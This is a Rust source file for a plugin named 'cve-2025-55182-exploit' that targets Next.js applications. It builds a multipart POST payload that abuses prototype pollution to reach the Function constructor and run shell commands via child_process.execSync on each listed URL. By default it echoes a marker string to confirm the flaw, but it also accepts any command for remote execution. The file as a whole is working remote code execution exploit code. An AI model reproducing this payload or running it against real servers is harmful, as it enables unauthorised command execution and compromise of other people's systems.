use extism_pdk::*;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};

#[derive(Serialize, Deserialize)]
struct PluginArgs {
    base_urls: Vec<String>,
    #[serde(default)]
    executable: Option<String>,
}

#[derive(Serialize)]
struct JsonSchema {
    #[serde(rename = "type")]
    schema_type: String,
    properties: SchemaProperties,
}

#[derive(Serialize)]
struct SchemaProperties {
    base_urls: PropertySchema,
    executable: PropertySchema,
}

#[derive(Serialize)]
struct PropertySchema {
    #[serde(rename = "type")]
    prop_type: String,
    description: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    default: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    items: Option<Box<PropertySchema>>,
}

#[plugin_fn]
pub fn name() -> FnResult<String> {
    Ok("cve-2025-55182-exploit".to_string())
}

#[plugin_fn]
pub fn description() -> FnResult<String> {
    Ok("Exploit plugin for CVE-2025-55182 - Next.js prototype pollution and command injection vulnerability".to_string())
}

#[plugin_fn]
pub fn json_schema() -> FnResult<String> {
    let schema = JsonSchema {
        schema_type: "object".to_string(),
        properties: SchemaProperties {
            base_urls: PropertySchema {
                prop_type: "array".to_string(),
                description: "Array of base URLs of target Next.js applications to scan (required)".to_string(),
                default: None,
                items: Some(Box::new(PropertySchema {
                    prop_type: "string".to_string(),
                    description: "Base URL of a target Next.js application".to_string(),
                    default: None,
                    items: None,
                })),
            },
            executable: PropertySchema {
                prop_type: "string".to_string(),
                description: "Arbitrary command to execute on the target system via command injection (defaults to 'echo HARNESS_<random_number>' for vulnerability testing)".to_string(),
                default: None,
                items: None,
            },
        },
    };
    
    Ok(serde_json::to_string(&schema)?)
}

// Helper function to test a single URL
fn test_url(base_url: &str, executable: &str, using_default: bool, harness_string: &str) -> Value {
    // Craft the malicious chunk for prototype pollution
    let crafted_chunk = json!({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": json!({"then": "$B0"}).to_string(),
        "_response": {
            "_prefix": format!("var res = process.mainModule.require('child_process').execSync('{}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});", executable),
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    });
    
    // Create multipart form data
    // Format: --boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{json}\r\n--boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n--boundary--
    let boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    let file0_content = crafted_chunk.to_string();
    let file1_content = "\"$@0\"";
    
    let mut multipart_body = Vec::new();
    
    // File 0
    multipart_body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    multipart_body.extend_from_slice(b"Content-Disposition: form-data; name=\"0\"\r\n\r\n");
    multipart_body.extend_from_slice(file0_content.as_bytes());
    multipart_body.extend_from_slice(b"\r\n");
    
    // File 1
    multipart_body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    multipart_body.extend_from_slice(b"Content-Disposition: form-data; name=\"1\"\r\n\r\n");
    multipart_body.extend_from_slice(file1_content.as_bytes());
    multipart_body.extend_from_slice(b"\r\n");
    
    // Closing boundary
    multipart_body.extend_from_slice(format!("--{}--\r\n", boundary).as_bytes());
    
    // Make HTTP POST request
    let content_type = format!("multipart/form-data; boundary={}", boundary);
    let req = HttpRequest::new(base_url)
        .with_method("POST")
        .with_header("Next-Action", "x")
        .with_header("Content-Type", &content_type);
    
    // Try to make the request - handle errors gracefully
    match http::request::<Vec<u8>>(&req, Some(multipart_body)) {
        Ok(res) => {
            let status_code = res.status_code();
            let body = String::from_utf8_lossy(&res.body()).to_string();
            
            // Check vulnerability: if using default echo command, check for HARNESS_<random_number> in response
            let (is_vulnerable, vulnerability_status) = if using_default {
                let vulnerable = body.contains(harness_string);
                let status = if vulnerable {
                    "VULNERABLE - Command injection confirmed"
                } else {
                    "NOT VULNERABLE - HARNESS string not found in response"
                };
                (Some(vulnerable), status)
            } else {
                (None, "Custom command executed - manual verification required")
            };
            
            // Create response
            let mut result = json!({
                "base_url": base_url,
                "status_code": status_code,
                "response_body": body,
                "executable": executable,
                "success": true,
            });
            
            if using_default {
                result["harness_string"] = json!(harness_string);
                result["vulnerable"] = json!(is_vulnerable.unwrap());
            }
            result["vulnerability_status"] = json!(vulnerability_status);
            
            result
        }
        Err(e) => {
            json!({
                "base_url": base_url,
                "success": false,
                "error": format!("{}", e),
            })
        }
    }
}

#[plugin_fn]
pub fn execute() -> FnResult<Json<Value>> {
    // Read input JSON args and deserialize using serde
    let input: Json<PluginArgs> = input()?;
    let args = input.0;
    
    // Validate required parameter
    if args.base_urls.is_empty() {
        return Err(WithReturnCode::new(
            Error::msg("base_urls parameter is required and must contain at least one URL"),
            1,
        ));
    }
    
    // Filter out empty URLs and validate
    let base_urls: Vec<String> = args.base_urls
        .into_iter()
        .filter(|url| !url.trim().is_empty())
        .collect();
    
    if base_urls.is_empty() {
        return Err(WithReturnCode::new(
            Error::msg("base_urls must contain at least one non-empty URL"),
            1,
        ));
    }
    
    // Generate a random number for vulnerability testing (shared across all URLs)
    let mut hasher = DefaultHasher::new();
    "cve-2025-55182-harness-test".hash(&mut hasher);
    let random_number = (hasher.finish() % 9000000000) + 1000000000; // 10-digit number
    let harness_string = format!("HARNESS_{}", random_number);
    
    // Use provided executable or default to echo with HARNESS_<random_number>
    let (executable, using_default) = if let Some(custom_exec) = args.executable {
        (custom_exec, false)
    } else {
        (format!("echo {}", harness_string), true)
    };
    
    // Test each URL and collect results
    let mut results = Vec::new();
    for base_url in &base_urls {
        let url_result = test_url(base_url, &executable, using_default, &harness_string);
        results.push(url_result);
    }
    
    // Count vulnerable URLs
    let vulnerable_count = results.iter()
        .filter(|r| r.get("vulnerable").and_then(|v| v.as_bool()).unwrap_or(false))
        .count();
    
    // Create final response
    let mut result = json!({
        "results": results,
        "total_urls": base_urls.len(),
        "vulnerable_count": vulnerable_count,
        "executable": executable,
    });
    
    if using_default {
        result["harness_string"] = json!(harness_string);
    }
    
    Ok(Json(result))
}
